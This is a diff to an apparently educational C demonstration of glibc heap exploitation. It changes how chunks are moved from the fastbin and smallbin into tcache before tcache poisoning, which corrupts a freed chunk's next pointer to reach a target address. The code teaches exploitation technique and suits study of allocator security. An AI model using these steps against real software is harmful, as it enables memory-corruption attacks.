@@ -154,11 +154,8 @@ int main() {
   new_top_size = top_size & PAGE_MASK;
   heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
   heap_ptr = malloc(SIZE_3); // do the free
-  printf("At this point, the latest freed chunk will be in fastbin while the other two in smallbin.\n");
-  printf("We do one more large allocation malloc(0x10000) to move the chunk from fastbin to smallbin, so 3 chunks in smallbin\n");
-  void *pad1 = malloc(0x10000); // a huge allocation that moves the fastbin to smallbin
-  printf("Now, we allocate one chunks from the smallbin, this will move the other two chunks into tcache.\n");
-  void *pad2 = malloc(SIZE_1); // allocate from the smallbin to move things into tcache
+  printf("Now, one more allocation will move the other two chunks to tcache\n");
+  void *pad = malloc(SIZE_1); // allocate one chunk from smallbin to move other chunks to tcache
 
   printf("Finally, we can do tcache poisoning.\n");
   // corrupt next ptr into pointing to target
